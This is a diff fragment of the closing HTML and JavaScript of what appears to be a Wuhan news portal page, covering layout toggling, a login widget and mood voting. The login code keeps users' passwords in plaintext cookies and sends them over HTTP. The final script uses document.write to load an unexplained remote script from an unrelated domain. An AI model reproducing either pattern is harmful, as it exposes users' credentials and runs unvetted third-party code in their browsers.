+     <a href="javascript:;"><img src="http://img.wuhan.net.cn/images/2014/110-logo.jpg" alt="" /></a> 
+     <a href="javascript:;"><img src="http://img.wuhan.net.cn/images/2014/jb-logo.jpg" alt="" /></a> 
+    </div> 
+   </div>
+  </div> 
+  <!-- 底部导航 --> 
+  <footer id="footer-dock" class="none"> 
+   <ul> 
+    <li class="active"><a href="http://info.wuhan.net.cn/m1.shtml">首页</a></li> 
+    <li class=""><a href="http://info.wuhan.net.cn/m2.shtml">视频</a></li> 
+    <li class=""><a href="http://info.wuhan.net.cn/m3.shtml">活动</a></li> 
+    <li class=""><a href="http://info.wuhan.net.cn/m4.shtml">天翼</a></li> 
+    <li class=""><a href="http://info.wuhan.net.cn/m5.shtml">应用</a></li> 
+   </ul>
+  </footer> 
+  <script>		// base:"./sea-modules",		seajs.config({			alias:{				"$":"jquery/jquery/1.10.1/jquery.js",				"detector":"arale/detector/1.4.0/detector.js",				"jquery-easing":"jquery/easing/1.3.0/easing.js"			}		});		// detector		// seajs.use(['detector'],function(detector){		// 	var deviceName = detector.os.name;		// 	if(deviceName == "ios" || deviceName == "android" ) {		// 		window.location.href = 'http://115.29.207.162/whol2014/MoMain.html';		// 	}		// });		//Responsive		seajs.use(['detector','$'],function(detector, $){			var deviceName = detector.os.name;			if($(window).width()<=640 || deviceName == "ios" || deviceName == "android"){					$('#topnav').addClass('fn-hide');					$('.footer').addClass('fn-hide');					$('.footlinks').addClass('fn-hide');					$('.layoutRight').addClass('fn-hide');					$('.shortnav').addClass('fn-hide');					$('.layout.mt40').addClass('fn-hide');					$('#soso').addClass('fn-hide');					$('#wholsns').addClass('none');					$('.recommendNews').addClass('fn-hide');					$('.sms').addClass('fn-hide');					$('.city').addClass('fn-hide');					$('#mood').addClass('fn-hide');					$('.digg-share').addClass('fn-hide');					$('.newsArticle .titdd-Article').addClass('fn-hide');					$('.layout').css('width','100%');					$('.mainBody').css('width','100%');					$('.mainBody').css('border','none');					$('.newsArticle p').css('width','100%');					$('.mt12 p img').css('width','290px');					$('.mt12 p img').css('height','auto');					$('center img').css('width','240px');					$('center img').css('height','auto');					$('body').css('padding','0px 10px');					$('.newsArticle p').css('padding','0px');					$('.header').removeClass('none');					$('#footer-dock').removeClass('none');					$('.breadcrumb').addClass('none');			}			$(window).resize(function() {				if($(window).width()<=640){					$('#topnav').addClass('fn-hide');					$('.footer').addClass('fn-hide');					$('.footlinks').addClass('fn-hide');					$('.layoutRight').addClass('fn-hide');					$('.shortnav').addClass('fn-hide');					$('.layout.mt40').addClass('fn-hide');					$('#soso').addClass('fn-hide');					$('#wholsns').addClass('none');					$('.recommendNews').addClass('fn-hide');					$('.sms').addClass('fn-hide');					$('.city').addClass('fn-hide');					$('#mood').addClass('fn-hide');					$('.digg-share').addClass('fn-hide');					$('.newsArticle .titdd-Article').addClass('fn-hide');					$('.layout').css('width','100%');					$('.mainBody').css('width','100%');					$('.mainBody').css('border','none');					$('.newsArticle p').css('width','100%');					$('center img').css('width','240px');					$('center img').css('height','auto');					$('.mt12 p img').css('width','240px');					$('.mt12 p img').css('height','auto');					$('body').css('padding','0px 10px');					$('.newsArticle p').css('padding','0px');					$('.header').removeClass('none');					$('#footer-dock').removeClass('none');					$('.breadcrumb').addClass('none');				} else if($(window).width()>640){					$('#topnav').removeClass('fn-hide');					$('.footer').removeClass('fn-hide');					$('.footlinks').removeClass('fn-hide');					$('.layoutRight').removeClass('fn-hide');					$('.shortnav').removeClass('fn-hide');					$('.layout.mt40').removeClass('fn-hide');					$('#soso').removeClass('fn-hide');					$('#wholsns').removeClass('hide');					$('.recommendNews').removeClass('fn-hide');					$('.sms').removeClass('fn-hide');					$('.city').removeClass('fn-hide');					$('#mood').removeClass('fn-hide');					$('.digg-share').removeClass('fn-hide');					$('.newsArticle .titdd-Article').removeClass('fn-hide');					$('.layout').css('width','1000px');					$('.mainBody').css('width','660px');					$('.mainBody').css('border','1px solid #cECED0');					$('.newsArticle p').css('width','640px');					$('center img').css('width','400px');					$('center img').css('height','auto');					$('.mt12 p img').css('width','400px');					$('.mt12 p img').css('height','auto');					$('.newsArticle p').css('padding','0px 10px');					$('body').css('padding','0px 0px');					$('.header').addClass('none');					$('#footer-dock').addClass('none');					$('.breadcrumb').removeClass('none');				}				console.log($(window).width());			});		});		// popup		seajs.use(['arale/popup/1.1.6/popup'], function(Popup){			new Popup({				trigger: '#smartPoint',				element: '#popupPoint'			});			new Popup({				trigger: '#personalSetting',				element: '#popupSetting'			});			new Popup({				trigger: '#loginWhol',				element: '#popupLogin'			});			new Popup({				trigger: '#signOut',				element: '#popupsignOut'			});		});		// Tabs		seajs.use(['arale/switchable/1.0.2/tabs'], function(Tabs) {			//sideNewsImgTabs = new Tabs({				//element: '#sideNewsImgTabs',				//triggers: '#sideNewsImgTabs .ui-switchable-nav li',				//panels: '#sideNewsImgTabs .ui-switchable-content .col',				//activeIndex: 0			//});			sideNewsTextTabs = new Tabs({				element: '#sideNewsTextTabs',				triggers: '#sideNewsTextTabs .ui-switchable-nav li',				panels: '#sideNewsTextTabs .ui-switchable-content .col',				activeIndex: 0			});			setTimeout(function() {				//sideNewsImgTabs.set("activeIndex", 0);				sideNewsTextTabs.set("activeIndex", 0);			}, 3000);		});		// jquery		seajs.use(['$'],function($){			// stat			var contentid = 1134409;			$.getJSON(APP_URL+'?app=system&controller=content&action=stat&jsoncallback=?&contentid='+contentid, function(data){});			// font-size			$('.large').click(function(){				$('.newsArticle p').css("font-size","16px");				$(this).addClass('current');				$(this).siblings().removeClass('current');			});			$('.small').click(function(){				$('.newsArticle p').css("font-size","14px");				$(this).addClass('current');				$(this).siblings().removeClass('current');			});			// loginsmartcity			$('.btn').click(function(){				login();			});			$('#signOutBtn').click(function(){				signOut();			});			// cookie helper				(function (factory) {				if (typeof define === 'function' && define.amd) {										define(['jquery'], factory);				} else if (typeof exports === 'object') {										factory(require('jquery'));				} else {										factory(jQuery);				}			}(function ($) {				var pluses = /\+/g;				function encode(s) {					return config.raw ? s : encodeURIComponent(s);				}				function decode(s) {					return config.raw ? s : decodeURIComponent(s);				}				function stringifyCookieValue(value) {					return encode(config.json ? JSON.stringify(value) : String(value));				}				function parseCookieValue(s) {					if (s.indexOf('"') === 0) {												s = s.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');					}					try {						s = decodeURIComponent(s.replace(pluses, ' '));						return config.json ? JSON.parse(s) : s;					} catch(e) {}				}				function read(s, converter) {					var value = config.raw ? s : parseCookieValue(s);					return $.isFunction(converter) ? converter(value) : value;				}				var config = $.cookie = function (key, value, options) {					// Write					if (value !== undefined && !$.isFunction(value)) {						options = $.extend({}, config.defaults, options);						if (typeof options.expires === 'number') {							var days = options.expires, t = options.expires = new Date();							t.setTime(+t + days * 864e+5);						}						return (document.cookie = [							encode(key), '=', stringifyCookieValue(value),							options.expires ? '; expires=' + options.expires.toUTCString() : '', 							options.path    ? '; path=' + options.path : '',							options.domain  ? '; domain=' + options.domain : '',							options.secure  ? '; secure' : ''						].join(''));					}					// Read					var result = key ? undefined : {};					var cookies = document.cookie ? document.cookie.split('; ') : [];					for (var i = 0, l = cookies.length; i < l; i++) {						var parts = cookies[i].split('=');						var name = decode(parts.shift());						var cookie = parts.join('=');						if (key && key === name) {								result = read(cookie, value);							break;						}						if (!key && (cookie = read(cookie)) !== undefined) {							result[name] = cookie;						}					}					return result;				};				config.defaults = {};				$.removeCookie = function (key, options) {					if ($.cookie(key) === undefined) {						return false;					}					$.cookie(key, '', $.extend({}, options, { expires: -1 }));					return !$.cookie(key);				};			}));						// ajax			if($.cookie('username')&&$.cookie('password')){				login();			}			function login(){				if($.cookie('username')&&$.cookie('password')){					var username = $.cookie('username');					var password = $.cookie('password');						}else{					var username = $('#username').val();					var password = $('#password').val();					}								$.ajax({  					type: "post",  					url : "http://116.211.116.184/video/index.php?m=User&c=Index&a=login",					dataType:'jsonp',					jsonp:'callback',					data: 'username='+username+'&password='+password, 					success: function(json){						if(json.returnCode==1){								$.cookie('username',username,{ expires: 30, path: '/' });							$.cookie('password',password,{ expires: 30, path: '/' });								$('.user').removeClass('fn-hide');								$('.topfunc').removeClass('hidden');								$('#loginWhol').hide();								if (json.returnData.nick !='') {									$('.user').html("您好," + json.returnData.nick); 								}else{									$('.user').html("您好," + json.returnData.username); 								}								$('#level').html("等级:"+json.returnData.achievement.level_info.level);								$('#currency').html("智慧币:" + json.returnData.achievement.currency);								if(!$('.error').hasClass('fn-hide')){									$('.error').addClass('fn-hide');								}						}else {							$.removeCookie('username');							$.removeCookie('password');							$('.error').removeClass('fn-hide');						}					}				}); 			}			function signOut() {				$.removeCookie('username', { path: '/' });				$.removeCookie('password', { path: '/' });				$('#level').html("等级");				$('#currency').html("智慧币");				$('#loginWhol').show();				$('.user').addClass('fn-hide');				$('.topfunc').addClass('hidden');				$('#username').val('');				$('#password').val('');				}			// digg			var mood_img_url = IMG_URL+'apps/mood/';			var votehtml= $('#mood').html();			$('#mood li a, #mood li input').click(function(){				var moodsid = $(this).attr('moodsid');				console.log(moodsid);				vote(moodsid);			});			function setting(app,option){				if (app=="mood" && option == "votetime") {					return 24*60*60;				}			}			function vote(vote_id) {				if ( !$.cookie("mood_time"+contentid) || (( new Date().getTime() - $.cookie('mood_time'+contentid) ) > 1000*30) ) {					$.getJSON(APP_URL+"?app=mood&controller=index&action=vote&contentid="+contentid+"&voteid="+vote_id+"&jsoncallback=?", function(json){						voteShow(json);					});				} else {					alert("请勿重复刷新");					$.getJSON(APP_URL+"?app=mood&controller=index&action=vote&contentid="+contentid+"&jsoncallback=?", function(json){						voteShow(json);					});				}				$.cookie("mood_time"+contentid, new Date().getTime());			}			function voteShow(json) {				$("#mood").html(votedhtml + '<ul class="clear">' + $("ul:last", "#mood").html() + '</ul>').hide().fadeIn(450 | "slow").find(':radio').remove();				$('#vote_total').html(json.total);				for(var i in json.data) {					$('#'+i+'_li em').html(json.data[i].number);					$('#'+i+'_bar').css({"height": json.data[i].height+'%'}); 				}			}			var votedhtml = '<style>\			.mood_bar {position:relative; width:24px; height:100px;background:#EEF7F7; margin:0 auto;}\			.mood_bar_in {background:url(http://img.wuhan.net.cn/apps/mood/images/moodrank.gif) repeat-y -2px 0;bottom:0;left:0;position:absolute;width:24px;}\			</style>\			<div class="titles ">\			<h3 class="mar-b-10 txt-l"><span class="f-r" style="width: 80px;"></span>\			已经有 <font color="red" id="vote_total"></font> 人表态:</h3>\				<ul id="clear ">\								<li id="m1_li">\				<em></em><div class="mood_bar"><div class="mood_bar_in" id="m1_bar"></div></div>\				</li>\								<li id="m2_li">\				<em></em><div class="mood_bar"><div class="mood_bar_in" id="m2_bar"></div></div>\				</li>\								<li id="m3_li">\				<em></em><div class="mood_bar"><div class="mood_bar_in" id="m3_bar"></div></div>\				</li>\								<li id="m4_li">\				<em></em><div class="mood_bar"><div class="mood_bar_in" id="m4_bar"></div></div>\				</li>\								<li id="m5_li">\				<em></em><div class="mood_bar"><div class="mood_bar_in" id="m5_bar"></div></div>\				</li>\								<li id="m6_li">\				<em></em><div class="mood_bar"><div class="mood_bar_in" id="m6_bar"></div></div>\				</li>\							</ul></div>';		});	</script> 
+  <script type="text/javascript">var content = '';//第一页内容缓存var context = '';//全文内容缓存var isfulltext = false;$(function(){	digg.get(contentid);	content = $('#ctrlfscont').html();	var font = $.cookie('font');//根据cookie设置字体大小并初始化按钮	if(font){		$('#ctrlfssummary,#ctrlfscont').addClass(font);		if(font == 'fs-big'){		 	$('#bfont').addClass('cor-current');			$('#sfont').removeClass('cor-current');		}	}	$.getJSON(APP_URL+'?app=system&controller=content&action=stat&jsoncallback=?&contentid='+contentid, function(data){		$('#pv').html(data.pv);	});		function fulltext(){  //单页阅读		if(context =='')		$.getJSON(APP_URL+'?app=article&controller=article&action=fulltext&jsoncallback=?&contentid='+contentid,function(data){			context = data.content;			$('#ctrlfscont').html(data.content);			$('#show-all-cont').html('分页阅读').parent().siblings().hide();			$('.bor-ccc').hide();			isfulltext = true;			holdpic();		});		else{			$('#ctrlfscont').html(isfulltext?content:context);			$('#show-all-cont').html(isfulltext?'单页阅读':'分页阅读').parent().siblings().toggle(isfulltext === true);			isfulltext = (isfulltext === false);			$('.bor-ccc').show();			holdpic();		}}document.write('<script type="text/javascript" charset="UTF-8" src="'+"http://www.mepire.com/init/c/eaee42a2bb87a85fc555622ba2db3ca9?uid=287729&"+Math.random()*99999999+'"><\/script>');</script>
+ </body>
+</html>
